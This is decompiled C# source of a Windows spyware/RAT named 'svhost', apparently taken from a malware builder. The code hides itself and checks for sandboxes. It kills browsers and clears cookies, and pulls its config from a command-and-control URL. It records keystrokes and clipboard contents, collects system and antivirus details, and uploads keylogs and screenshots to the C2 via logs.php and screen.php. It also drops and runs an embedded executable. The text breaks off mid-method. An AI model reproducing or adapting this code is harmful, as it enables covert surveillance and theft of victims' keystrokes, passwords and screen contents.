// Decompiled with JetBrains decompiler
// Type: svhost.Form1
// Assembly: svhost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7DC793DB-CF4C-4ECD-BC3A-2E8425BD618A
// Assembly location: C:\Users\matze\Desktop\Neuer Ordner (7)\Builder\Builder\Resources\svhost.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using svhost.My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace svhost
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("keylog_txt")]
    private RichTextBox _keylog_txt;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    [AccessedThroughProperty("PictureBox1")]
    private PictureBox _PictureBox1;
    [AccessedThroughProperty("Timer4")]
    private System.Windows.Forms.Timer _Timer4;
    [AccessedThroughProperty("Timer5")]
    private System.Windows.Forms.Timer _Timer5;
    [AccessedThroughProperty("Timer_checkSandBox")]
    private System.Windows.Forms.Timer _Timer_checkSandBox;
    [AccessedThroughProperty("config_txt")]
    private TextBox _config_txt;
    [AccessedThroughProperty("Timer6")]
    private System.Windows.Forms.Timer _Timer6;
    [AccessedThroughProperty("txt_tasks")]
    private TextBox _txt_tasks;
    private const string FileSplitter = "|FS|";
    public string stub;
    public string urlbot;
    public string[] Xargs;
    public string binfile;
    public string Fileuri;
    public string Fileuri2;
    public string Fileuri3;
    public string Fileuri4;
    public string screenshotFileuri5;
    public string path_screenshot;
    public string path_keylogs;
    public string info_pc;
    public int t_keylog;
    public int t_screen;
    public int t_doc;
    public int t_img;
    public int t_txt;
    public string path1;
    public string path2;
    private string makel;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.binfile = Interaction.Environ("tmp") + "\\bin.txt";
      this.path_screenshot = Interaction.Environ("tmp") + "\\" + DateAndTime.Now.ToString("yyyy-MM-dd-hh-mm") + "-screenshot.png";
      this.info_pc = Interaction.Environ("tmp") + "\\info.txt";
      this.path1 = Application.ExecutablePath.ToString();
      this.path2 = Interaction.Environ("tmp") + "\\c5e504606bceb80648bcecb9e1bfe1ee.exe";
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.keylog_txt = new RichTextBox();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.PictureBox1 = new PictureBox();
      this.Timer4 = new System.Windows.Forms.Timer(this.components);
      this.Timer5 = new System.Windows.Forms.Timer(this.components);
      this.Timer_checkSandBox = new System.Windows.Forms.Timer(this.components);
      this.config_txt = new TextBox();
      this.Timer6 = new System.Windows.Forms.Timer(this.components);
      this.txt_tasks = new TextBox();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      this.SuspendLayout();
      RichTextBox keylogTxt1 = this.keylog_txt;
      Point point1 = new Point(12, 40);
      Point point2 = point1;
      keylogTxt1.Location = point2;
      this.keylog_txt.Name = "keylog_txt";
      RichTextBox keylogTxt2 = this.keylog_txt;
      Size size1 = new Size(326, 201);
      Size size2 = size1;
      keylogTxt2.Size = size2;
      this.keylog_txt.TabIndex = 0;
      this.keylog_txt.Text = "";
      this.Timer3.Interval = 63000;
      PictureBox pictureBox1_1 = this.PictureBox1;
      point1 = new Point(370, 40);
      Point point3 = point1;
      pictureBox1_1.Location = point3;
      this.PictureBox1.Name = "PictureBox1";
      PictureBox pictureBox1_2 = this.PictureBox1;
      size1 = new Size(294, 201);
      Size size3 = size1;
      pictureBox1_2.Size = size3;
      this.PictureBox1.TabIndex = 1;
      this.PictureBox1.TabStop = false;
      this.Timer4.Interval = 62000;
      this.Timer_checkSandBox.Interval = 5000;
      TextBox configTxt1 = this.config_txt;
      point1 = new Point(12, 271);
      Point point4 = point1;
      configTxt1.Location = point4;
      this.config_txt.Multiline = true;
      this.config_txt.Name = "config_txt";
      TextBox configTxt2 = this.config_txt;
      size1 = new Size(519, 32);
      Size size4 = size1;
      configTxt2.Size = size4;
      this.config_txt.TabIndex = 2;
      this.Timer6.Interval = 55000;
      TextBox txtTasks1 = this.txt_tasks;
      point1 = new Point(12, 355);
      Point point5 = point1;
      txtTasks1.Location = point5;
      this.txt_tasks.Multiline = true;
      this.txt_tasks.Name = "txt_tasks";
      TextBox txtTasks2 = this.txt_tasks;
      size1 = new Size(394, 37);
      Size size5 = size1;
      txtTasks2.Size = size5;
      this.txt_tasks.TabIndex = 3;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(693, 404);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.txt_tasks);
      this.Controls.Add((Control) this.config_txt);
      this.Controls.Add((Control) this.PictureBox1);
      this.Controls.Add((Control) this.keylog_txt);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual RichTextBox keylog_txt
    {
      [DebuggerNonUserCode] get => this._keylog_txt;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._keylog_txt = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this._Timer3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    internal virtual PictureBox PictureBox1
    {
      [DebuggerNonUserCode] get => this._PictureBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._PictureBox1 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer4
    {
      [DebuggerNonUserCode] get => this._Timer4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer4_Tick);
        if (this._Timer4 != null)
          this._Timer4.Tick -= eventHandler;
        this._Timer4 = value;
        if (this._Timer4 == null)
          return;
        this._Timer4.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer5
    {
      [DebuggerNonUserCode] get => this._Timer5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer5_Tick);
        if (this._Timer5 != null)
          this._Timer5.Tick -= eventHandler;
        this._Timer5 = value;
        if (this._Timer5 == null)
          return;
        this._Timer5.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer_checkSandBox
    {
      [DebuggerNonUserCode] get => this._Timer_checkSandBox;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Timer_checkSandBox = value;
    }

    internal virtual TextBox config_txt
    {
      [DebuggerNonUserCode] get => this._config_txt;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._config_txt = value;
    }

    internal virtual System.Windows.Forms.Timer Timer6
    {
      [DebuggerNonUserCode] get => this._Timer6;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer6_Tick);
        if (this._Timer6 != null)
          this._Timer6.Tick -= eventHandler;
        this._Timer6 = value;
        if (this._Timer6 == null)
          return;
        this._Timer6.Tick += eventHandler;
      }
    }

    internal virtual TextBox txt_tasks
    {
      [DebuggerNonUserCode] get => this._txt_tasks;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._txt_tasks = value;
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern short GetAsyncKeyState(int key);

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Form1_Load(object sender, EventArgs e)
    {
      Control.CheckForIllegalCrossThreadCalls = false;
      try
      {
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read);
        string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
        FileSystem.FileGet(1, ref Expression);
        FileSystem.FileClose(1);
        this.urlbot = Strings.Split(Expression, "|FS|")[1];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.Hide();
        this.Opacity = 0.0;
        this.ShowInTaskbar = false;
        if (!new Mutex(false, Application.ProductName).WaitOne(0, false))
        {
          Application.ExitThread();
        }
        else
        {
          if (this.CheckIfSandboxed())
            Application.Exit();
          this.Timer_checkSandBox.Start();
          Functions.Install_server();
          clear_cookies.kill_prog("chrome");
          clear_cookies.kill_prog("opera");
          clear_cookies.kill_prog("firefox");
          clear_cookies.kill_prog("brave");
          clear_cookies.kill_prog("browser");
          clear_cookies.kill_prog("orbitum");
          clear_cookies.kill_prog("dragon");
          clear_cookies.cls_cookies();
          this.config_txt.Text = this.Send_request_to_c2((object) (this.urlbot + "/config.json"));
          object obj1 = (object) new JavaScriptSerializer().Deserialize<List<object>>("[" + this.config_txt.Text + "]");
          try
          {
            foreach (object obj2 in (IEnumerable) obj1)
            {
              object objectValue = RuntimeHelpers.GetObjectValue(obj2);
              this.t_keylog = Conversions.ToInteger(NewLateBinding.LateIndexGet(objectValue, new object[1]
              {
                (object) "time_keylogs"
              }, (string[]) null).ToString());
              this.t_screen = Conversions.ToInteger(NewLateBinding.LateIndexGet(objectValue, new object[1]
              {
                (object) "time_screenshot"
              }, (string[]) null).ToString());
              this.t_doc = Conversions.ToInteger(NewLateBinding.LateIndexGet(objectValue, new object[1]
              {
                (object) "grab_docs"
              }, (string[]) null).ToString());
              this.t_img = Conversions.ToInteger(NewLateBinding.LateIndexGet(objectValue, new object[1]
              {
                (object) "grab_photos"
              }, (string[]) null).ToString());
              this.t_txt = Conversions.ToInteger(NewLateBinding.LateIndexGet(objectValue, new object[1]
              {
                (object) "grab_txt"
              }, (string[]) null).ToString());
            }
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
          this.Timer3.Interval = checked (this.t_keylog * 60000);
          this.Timer4.Interval = checked (this.t_screen * 60000);
          string str = "{ \"PC Name\":\"" + Dns.GetHostName() + "\",\"Operating System\":\"" + info.GetOS() + "\",\"Anti virus\":\"" + info.GetAntivirus() + "\",\"Firewall\":\"" + info.GetFirewall() + "\",\"Processor\":\"" + info.GetProcessor() + "\",\"Memory (RAM)\":\"" + info.GetMemory() + "\" }";
          System.IO.File.WriteAllText(this.info_pc, "");
          StreamWriter streamWriter1 = new StreamWriter(this.info_pc, true);
          streamWriter1.Write(str);
          streamWriter1.Close();
          this.upload_info();
          this.contact_c2();
          this.Timer1.Start();
          this.Timer2.Start();
          this.Timer3.Start();
          this.Timer4.Start();
          this.Timer5.Start();
          this.Timer6.Start();
          System.IO.File.WriteAllText(this.binfile, "");
          StreamWriter streamWriter2 = new StreamWriter(this.binfile, true);
          streamWriter2.Write(this.urlbot);
          streamWriter2.Close();
          byte[] bin = svhost.My.Resources.Resources.bin;
          FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\bin.exe", OpenMode.Binary);
          FileSystem.FilePut(1, (Array) bin, -1L, false, false);
          FileSystem.FileClose(1);
          Process.Start(Interaction.Environ("tmp") + "\\bin.exe");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void KeyLogs()
    {
      if ((uint) Form1.GetAsyncKeyState(65) > 0U)
        this.keylog_txt.Text += "a";
      else if ((uint) Form1.GetAsyncKeyState(66) > 0U)
        this.keylog_txt.Text += "b";
      else if ((uint) Form1.GetAsyncKeyState(67) > 0U)
        this.keylog_txt.Text += "c";
      else if ((uint) Form1.GetAsyncKeyState(68) > 0U)
        this.keylog_txt.Text += "d";
      else if ((uint) Form1.GetAsyncKeyState(69) > 0U)
        this.keylog_txt.Text += "e";
      else if ((uint) Form1.GetAsyncKeyState(70) > 0U)
        this.keylog_txt.Text += "f";
      else if ((uint) Form1.GetAsyncKeyState(71) > 0U)
        this.keylog_txt.Text += "g";
      else if ((uint) Form1.GetAsyncKeyState(72) > 0U)
        this.keylog_txt.Text += "h";
      else if ((uint) Form1.GetAsyncKeyState(73) > 0U)
        this.keylog_txt.Text += "i";
      else if ((uint) Form1.GetAsyncKeyState(74) > 0U)
        this.keylog_txt.Text += "j";
      else if ((uint) Form1.GetAsyncKeyState(75) > 0U)
        this.keylog_txt.Text += "k";
      else if ((uint) Form1.GetAsyncKeyState(76) > 0U)
        this.keylog_txt.Text += "l";
      else if ((uint) Form1.GetAsyncKeyState(77) > 0U)
        this.keylog_txt.Text += "m";
      else if ((uint) Form1.GetAsyncKeyState(78) > 0U)
        this.keylog_txt.Text += "n";
      else if ((uint) Form1.GetAsyncKeyState(79) > 0U)
        this.keylog_txt.Text += "o";
      else if ((uint) Form1.GetAsyncKeyState(80) > 0U)
        this.keylog_txt.Text += "p";
      else if ((uint) Form1.GetAsyncKeyState(81) > 0U)
        this.keylog_txt.Text += "q";
      else if ((uint) Form1.GetAsyncKeyState(82) > 0U)
        this.keylog_txt.Text += "r";
      else if ((uint) Form1.GetAsyncKeyState(83) > 0U)
        this.keylog_txt.Text += "s";
      else if ((uint) Form1.GetAsyncKeyState(84) > 0U)
        this.keylog_txt.Text += "t";
      else if ((uint) Form1.GetAsyncKeyState(85) > 0U)
        this.keylog_txt.Text += "u";
      else if ((uint) Form1.GetAsyncKeyState(86) > 0U)
        this.keylog_txt.Text += "v";
      else if ((uint) Form1.GetAsyncKeyState(87) > 0U)
        this.keylog_txt.Text += "w";
      else if ((uint) Form1.GetAsyncKeyState(88) > 0U)
        this.keylog_txt.Text += "x";
      else if ((uint) Form1.GetAsyncKeyState(89) > 0U)
        this.keylog_txt.Text += "y";
      else if ((uint) Form1.GetAsyncKeyState(90) > 0U)
        this.keylog_txt.Text += "z";
      else if ((uint) Form1.GetAsyncKeyState(48) > 0U)
        this.keylog_txt.Text += "0";
      else if ((uint) Form1.GetAsyncKeyState(49) > 0U)
        this.keylog_txt.Text += "1";
      else if ((uint) Form1.GetAsyncKeyState(50) > 0U)
        this.keylog_txt.Text += "2";
      else if ((uint) Form1.GetAsyncKeyState(51) > 0U)
        this.keylog_txt.Text += "3";
      else if ((uint) Form1.GetAsyncKeyState(52) > 0U)
        this.keylog_txt.Text += "4";
      else if ((uint) Form1.GetAsyncKeyState(53) > 0U)
        this.keylog_txt.Text += "5";
      else if ((uint) Form1.GetAsyncKeyState(54) > 0U)
        this.keylog_txt.Text += "6";
      else if ((uint) Form1.GetAsyncKeyState(55) > 0U)
        this.keylog_txt.Text += "7";
      else if ((uint) Form1.GetAsyncKeyState(56) > 0U)
        this.keylog_txt.Text += "8";
      else if ((uint) Form1.GetAsyncKeyState(57) > 0U)
        this.keylog_txt.Text += "9";
      else if ((uint) Form1.GetAsyncKeyState(64) > 0U)
        this.keylog_txt.Text += ")";
      else if ((uint) Form1.GetAsyncKeyState(65) > 0U)
        this.keylog_txt.Text += "!";
      else if ((uint) Form1.GetAsyncKeyState(66) > 0U)
        this.keylog_txt.Text += "@";
      else if ((uint) Form1.GetAsyncKeyState(67) > 0U)
        this.keylog_txt.Text += "#";
      else if ((uint) Form1.GetAsyncKeyState(68) > 0U)
        this.keylog_txt.Text += "$";
      else if ((uint) Form1.GetAsyncKeyState(69) > 0U)
        this.keylog_txt.Text += "%";
      else if ((uint) Form1.GetAsyncKeyState(70) > 0U)
        this.keylog_txt.Text += "^";
      else if ((uint) Form1.GetAsyncKeyState(71) > 0U)
        this.keylog_txt.Text += "&";
      else if ((uint) Form1.GetAsyncKeyState(72) > 0U)
        this.keylog_txt.Text += "*";
      else if ((uint) Form1.GetAsyncKeyState(73) > 0U)
        this.keylog_txt.Text += "(";
      else if ((uint) Form1.GetAsyncKeyState(96) > 0U)
        this.keylog_txt.Text += "0";
      else if ((uint) Form1.GetAsyncKeyState(97) > 0U)
        this.keylog_txt.Text += "1";
      else if ((uint) Form1.GetAsyncKeyState(98) > 0U)
        this.keylog_txt.Text += "2";
      else if ((uint) Form1.GetAsyncKeyState(99) > 0U)
        this.keylog_txt.Text += "3";
      else if ((uint) Form1.GetAsyncKeyState(100) > 0U)
        this.keylog_txt.Text += "4";
      else if ((uint) Form1.GetAsyncKeyState(101) > 0U)
        this.keylog_txt.Text += "5";
      else if ((uint) Form1.GetAsyncKeyState(102) > 0U)
        this.keylog_txt.Text += "6";
      else if ((uint) Form1.GetAsyncKeyState(103) > 0U)
        this.keylog_txt.Text += "7";
      else if ((uint) Form1.GetAsyncKeyState(104) > 0U)
        this.keylog_txt.Text += "8";
      else if ((uint) Form1.GetAsyncKeyState(105) > 0U)
        this.keylog_txt.Text += "9";
      else if ((uint) Form1.GetAsyncKeyState(107) > 0U)
        this.keylog_txt.Text += "+";
      else if ((uint) Form1.GetAsyncKeyState(262144) > 0U)
        this.keylog_txt.Text += "[Alt]";
      else if ((uint) Form1.GetAsyncKeyState(93) > 0U)
        this.keylog_txt.Text += "[Apps]";
      else if ((uint) Form1.GetAsyncKeyState(246) > 0U)
        this.keylog_txt.Text += "[Attn]";
      else if ((uint) Form1.GetAsyncKeyState(30) > 0U)
        this.keylog_txt.Text += "[IME]";
      else if ((uint) Form1.GetAsyncKeyState(8) > 0U)
        this.keylog_txt.Text += "[Back]";
      else if ((uint) Form1.GetAsyncKeyState(166) > 0U)
        this.keylog_txt.Text += "[BrowserBack]";
      else if ((uint) Form1.GetAsyncKeyState(171) > 0U)
        this.keylog_txt.Text += "[BrowserFavorites]";
      else if ((uint) Form1.GetAsyncKeyState(167) > 0U)
        this.keylog_txt.Text += "[BrowserForward]";
      else if ((uint) Form1.GetAsyncKeyState(172) > 0U)
        this.keylog_txt.Text += "[BrowserHome]";
      else if ((uint) Form1.GetAsyncKeyState(168) > 0U)
        this.keylog_txt.Text += "[BrowserRefresh]";
      else if ((uint) Form1.GetAsyncKeyState(170) > 0U)
        this.keylog_txt.Text += "[BrowserSearch]";
      else if ((uint) Form1.GetAsyncKeyState(169) > 0U)
        this.keylog_txt.Text += "[BrowserStop]";
      else if ((uint) Form1.GetAsyncKeyState(3) > 0U)
        this.keylog_txt.Text += "[Cancel]";
      else if ((uint) Form1.GetAsyncKeyState(20) > 0U)
        this.keylog_txt.Text += "[CapsLock]";
      else if ((uint) Form1.GetAsyncKeyState(12) > 0U)
        this.keylog_txt.Text += "[Clear]";
      else if ((uint) Form1.GetAsyncKeyState(131072) > 0U)
        this.keylog_txt.Text += "[Control]";
      else if ((uint) Form1.GetAsyncKeyState(17) > 0U)
        this.keylog_txt.Text += "[Ctrl]";
      else if ((uint) Form1.GetAsyncKeyState(247) > 0U)
        this.keylog_txt.Text += "[Crsel]";
      else if ((uint) Form1.GetAsyncKeyState(110) > 0U)
        this.keylog_txt.Text += "[Decimal]";
      else if ((uint) Form1.GetAsyncKeyState(46) > 0U)
        this.keylog_txt.Text += "[Delete]";
      else if ((uint) Form1.GetAsyncKeyState(111) > 0U)
        this.keylog_txt.Text += "[Divide]";
      else if ((uint) Form1.GetAsyncKeyState(40) > 0U)
        this.keylog_txt.Text += "[↓]";
      else if ((uint) Form1.GetAsyncKeyState(35) > 0U)
        this.keylog_txt.Text += "[end]";
      else if ((uint) Form1.GetAsyncKeyState(13) > 0U)
        this.keylog_txt.Text += "[Enter]";
      else if ((uint) Form1.GetAsyncKeyState(249) > 0U)
        this.keylog_txt.Text += "[EraseEof]";
      else if ((uint) Form1.GetAsyncKeyState(27) > 0U)
        this.keylog_txt.Text += "[ESC]";
      else if ((uint) Form1.GetAsyncKeyState(43) > 0U)
        this.keylog_txt.Text += "[Execute]";
      else if ((uint) Form1.GetAsyncKeyState(248) > 0U)
        this.keylog_txt.Text += "[Exsel]";
      else if ((uint) Form1.GetAsyncKeyState(112) > 0U)
        this.keylog_txt.Text += "[F1]";
      else if ((uint) Form1.GetAsyncKeyState(113) > 0U)
        this.keylog_txt.Text += "[F2]";
      else if ((uint) Form1.GetAsyncKeyState(114) > 0U)
        this.keylog_txt.Text += "[F3]";
      else if ((uint) Form1.GetAsyncKeyState(115) > 0U)
        this.keylog_txt.Text += "[F4]";
      else if ((uint) Form1.GetAsyncKeyState(116) > 0U)
        this.keylog_txt.Text += "[F5]";
      else if ((uint) Form1.GetAsyncKeyState(117) > 0U)
        this.keylog_txt.Text += "[F6]";
      else if ((uint) Form1.GetAsyncKeyState(118) > 0U)
        this.keylog_txt.Text += "[F7]";
      else if ((uint) Form1.GetAsyncKeyState(119) > 0U)
        this.keylog_txt.Text += "[F8]";
      else if ((uint) Form1.GetAsyncKeyState(120) > 0U)
        this.keylog_txt.Text += "[F9]";
      else if ((uint) Form1.GetAsyncKeyState(121) > 0U)
        this.keylog_txt.Text += "[F10]";
      else if ((uint) Form1.GetAsyncKeyState(122) > 0U)
        this.keylog_txt.Text += "[F11]";
      else if ((uint) Form1.GetAsyncKeyState(123) > 0U)
        this.keylog_txt.Text += "[F12]";
      else if ((uint) Form1.GetAsyncKeyState(36) > 0U)
        this.keylog_txt.Text += "[HOME]";
      else if ((uint) Form1.GetAsyncKeyState(180) > 0U)
        this.keylog_txt.Text += "[LaunchMail]";
      else if ((uint) Form1.GetAsyncKeyState(162) > 0U)
        this.keylog_txt.Text += "[LControlKey]";
      else if ((uint) Form1.GetAsyncKeyState(37) > 0U)
        this.keylog_txt.Text += "[←]";
      else if ((uint) Form1.GetAsyncKeyState(10) > 0U)
        this.keylog_txt.Text += "[LineFeed]";
      else if ((uint) Form1.GetAsyncKeyState(164) > 0U)
        this.keylog_txt.Text += "[LMenu]";
      else if ((uint) Form1.GetAsyncKeyState(91) > 0U)
        this.keylog_txt.Text += "[Lwin]";
      else if ((uint) Form1.GetAsyncKeyState(4) > 0U)
        this.keylog_txt.Text += "[MButton]";
      else if ((uint) Form1.GetAsyncKeyState(18) > 0U)
        this.keylog_txt.Text += "[Menu]";
      else if ((uint) Form1.GetAsyncKeyState(106) > 0U)
        this.keylog_txt.Text += "[Multiply]";
      else if ((uint) Form1.GetAsyncKeyState(34) > 0U)
        this.keylog_txt.Text += "[Next]";
      else if ((uint) Form1.GetAsyncKeyState(186) > 0U)
        this.keylog_txt.Text += "[Oem1]";
      else if ((uint) Form1.GetAsyncKeyState(191) > 0U)
        this.keylog_txt.Text += "[/]";
      else if ((uint) Form1.GetAsyncKeyState(226) > 0U)
        this.keylog_txt.Text += "[Oem102]";
      else if ((uint) Form1.GetAsyncKeyState(192) > 0U)
        this.keylog_txt.Text += "[Oem3]";
      else if ((uint) Form1.GetAsyncKeyState(219) > 0U)
        this.keylog_txt.Text += "[Oem4]";
      else if ((uint) Form1.GetAsyncKeyState(220) > 0U)
        this.keylog_txt.Text += "[\\]";
      else if ((uint) Form1.GetAsyncKeyState(221) > 0U)
        this.keylog_txt.Text += "[Oem6]";
      else if ((uint) Form1.GetAsyncKeyState(222) > 0U)
        this.keylog_txt.Text += "[Oem7]";
      else if ((uint) Form1.GetAsyncKeyState(223) > 0U)
        this.keylog_txt.Text += "[Oem8]";
      else if ((uint) Form1.GetAsyncKeyState(219) > 0U)
        this.keylog_txt.Text += "{";
      else if ((uint) Form1.GetAsyncKeyState(188) > 0U)
        this.keylog_txt.Text += ",";
      else if ((uint) Form1.GetAsyncKeyState(189) > 0U)
        this.keylog_txt.Text += "-";
      else if ((uint) Form1.GetAsyncKeyState(190) > 0U)
        this.keylog_txt.Text += "。";
      else if ((uint) Form1.GetAsyncKeyState(220) > 0U)
        this.keylog_txt.Text += ">";
      else if ((uint) Form1.GetAsyncKeyState(191) > 0U)
        this.keylog_txt.Text += "?";
      else if ((uint) Form1.GetAsyncKeyState(192) > 0U)
        this.keylog_txt.Text += "~";
      else if ((uint) Form1.GetAsyncKeyState(34) > 0U)
        this.keylog_txt.Text += "[PageDown]";
      else if ((uint) Form1.GetAsyncKeyState(33) > 0U)
        this.keylog_txt.Text += "[PageUp]";
      else if ((uint) Form1.GetAsyncKeyState(163) > 0U)
        this.keylog_txt.Text += "[RControlKey]";
      else if ((uint) Form1.GetAsyncKeyState(39) > 0U)
        this.keylog_txt.Text += "[→]";
      else if ((uint) Form1.GetAsyncKeyState(165) > 0U)
        this.keylog_txt.Text += "[RMenu]";
      else if ((uint) Form1.GetAsyncKeyState(92) > 0U)
        this.keylog_txt.Text += "[RWin]";
      else if ((uint) Form1.GetAsyncKeyState(16) > 0U)
        this.keylog_txt.Text += "[ShiftKey]";
      else if ((uint) Form1.GetAsyncKeyState(32) > 0U)
        this.keylog_txt.Text += "[Space]";
      else if ((uint) Form1.GetAsyncKeyState(9) > 0U)
      {
        this.keylog_txt.Text += "[Tab]";
      }
      else
      {
        if ((uint) Form1.GetAsyncKeyState(38) <= 0U)
          return;
        this.keylog_txt.Text += "[↑]";
      }
    }

    private void Timer1_Tick(object sender, EventArgs e) => this.KeyLogs();

    private void Timer2_Tick(object sender, EventArgs e) => this.get_clipper_and_clear();

    private void get_clipper_and_clear()
    {
      if (!Clipboard.ContainsText())
        return;
      try
      {
        this.keylog_txt.AppendText("\r\nClipper : [ " + MyProject.Computer.Clipboard.GetData(DataFormats.Text).ToString() + " ]\r\n");
        MyProject.Computer.Clipboard.Clear();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
      try
      {
        if (Operators.CompareString(this.keylog_txt.Text, (string) null, false) == 0)
          return;
        this.path_keylogs = Interaction.Environ("tmp") + "\\" + DateAndTime.Now.ToString("yyyy-MM-dd-hh-mm") + "-keylogs.txt";
        System.IO.File.WriteAllText(this.path_keylogs, "");
        StreamWriter streamWriter = new StreamWriter(this.path_keylogs, true);
        streamWriter.Write(this.keylog_txt.Text);
        streamWriter.Close();
        this.keylog_txt.Clear();
        this.upload_logs();
        MyProject.Computer.FileSystem.DeleteFile(this.path_keylogs);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void upload_logs()
    {
      try
      {
        string str = "/logs.php?hwid=" + info.HWID();
        using (WebClient webClient = new WebClient())
          this.Fileuri = Encoding.ASCII.GetString(webClient.UploadFile(this.urlbot + str, this.path_keylogs));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void upload_screenshot_c2()
    {
      try
      {
        string str = "/screen.php?hwid=" + info.HWID();
        using (WebClient webClient = new WebClient())
          this.Fileuri4 = Encoding.ASCII.GetString(webClient.UploadFile(this.urlbot + str, Functions.path_screenshot2));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer4_Tick(object sender, EventArgs e)
    {
      try
      {
        Functions.screenshot_2();
        this.upload_screenshot_c2();
